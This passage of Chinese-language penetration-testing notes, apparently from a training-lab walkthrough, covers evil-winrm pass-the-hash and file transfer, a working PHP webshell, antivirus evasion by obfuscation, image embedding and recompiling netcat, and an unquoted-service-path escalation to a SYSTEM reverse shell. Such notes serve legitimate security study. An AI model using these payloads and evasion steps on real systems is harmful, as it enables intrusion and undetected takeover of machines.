#### 上传/下载与本地脚本

- **`evil-winrm`**:
    
    - `upload LOCAL_FILEPATH REMOTE_FILEPATH`: 上传文件。
        
    - `download REMOTE_FILEPATH LOCAL_FILEPATH`: 下载文件。
        
    - `-s /path/to/scripts`: **内存加载**。指定一个本地目录，其中的 PowerShell 脚本可以直接在 `evil-winrm` 会话中导入和执行，无需接触目标磁盘，非常隐蔽。
        
        Bash
        
        ```
        # 包含本地脚本目录并连接
        evil-winrm -u Administrator -H <HASH> -i <IP> -s /path/to/empire/scripts
        # 在 evil-winrm shell 中直接运行脚本
        Invoke-Portscan.ps1
        Invoke-Portscan -Hosts 172.16.0.10 -TopPorts 50
        ```
        
#### Git 信息提取

- **GitTools**: 一套用于处理暴露的 `.git` 目录的工具。
    
    - **Dumper**: 从网站下载暴露的 `.git` 目录。
        
    - **Extractor**: 将本地的 `.git` 目录（无论是下载的还是直接窃取的）重新构建为一个可读的、包含所有提交历史的仓库。
        
        Bash
        
        ```
        # 将当前目录下的 .git 仓库内容提取到 "Website" 子目录
        ./GitTools/Extractor/extractor.sh . Website
        ```
        
#### Webshell 免杀

1. **构建 Payload**: 编写一个功能完整但结构不常见的 PHP webshell。
    
    PHP
    
    ```
    <?php
        $cmd = $_GET["wreath"];
        if(isset($cmd)){
            echo "<pre>" . shell_exec($cmd) . "</pre>";
        }
        die();
    ?>
    ```
    
2. **混淆 Payload**: 使用在线工具（如 [gaijin.at](https://www.gaijin.at/en/tools/php-obfuscator)）对代码进行混淆，使其难以被基于签名的 AV 检测。
    
3. **嵌入图像**: 使用 `exiftool` 将混淆后的 PHP 代码嵌入到图像文件的元数据（如 `Comment` 字段）中。
    
    Bash
    
    ```
    exiftool -Comment="<?php ... ?>" shell.jpeg.php
    ```
    
#### Netcat 免杀：交叉编译

- **问题**: Kali 自带的 `nc.exe` 很容易被 Windows Defender 检测。
    
- **解决方案**: 获取 Netcat 的源代码，并使用 `mingw-w64` 在 Kali 上将其**交叉编译**为一个新的、独特的 Windows 可执行文件。
    
    1. **安装编译器**: `sudo apt install mingw-w64`
        
    2. **修改 Makefile**: 在 Netcat 源代码的 `Makefile` 中，将编译器 `CC` 指定为 `x86_64-w64-mingw32-gcc`。
        
    3. **编译**: `make`

#### AV 枚举

在尝试提权前，先进行一些手动的、低噪音的枚举。

- **权限检查**: `whoami /priv`, `whoami /groups`
    
- **寻找非默认服务**:
    
    Code snippet
    
    ```
    wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
    ```
    
- **检查服务配置**: `sc qc <SERVICE_NAME>` (寻找**未加引号的服务路径**漏洞)。
    
- **检查目录权限**: `powershell "get-acl -Path 'C:\path\to\folder' | format-list"`
    
#### 绕过 AV 提权：未加引号的服务路径

这是一个经典的提权漏洞，利用了 Windows 处理带有空格且未加引号的路径的方式。

1. **编写包装器 (Wrapper)**: 使用 C# 编写一个非常简单的程序，其唯一功能就是执行一个命令（例如，启动 `nc.exe` 来建立反向 shell）。
    
2. **交叉编译**: 使用 `mono-devel` 在 Kali 上将 C# 代码编译为 `.exe` 文件。
    
    Bash
    
    ```
    sudo apt install mono-devel
    mcs Wrapper.cs
    ```
    
3. **上传**: 使用 `impacket` 的 `smbserver.py` 在攻击机上快速搭建一个 SMB 服务器，然后在目标上使用 `net use` 和 `copy` 命令将编译好的包装器上传。
    
4. **放置 Payload**: 将包装器复制到可写的、路径中包含空格的目录，并将其重命名为 Windows 会优先执行的名称（例如，如果服务路径是 `C:\Program Files (x86)\System Explorer\service.exe`，则将包装器命名为 `C:\Program Files (x86)\System.exe`）。
    
5. **触发**: 重启服务 (`sc stop <service>`, `sc start <service>`) 或重启机器，服务启动时会执行你的包装器，从而以 `NT AUTHORITY\SYSTEM` 权限获得一个反向 shell。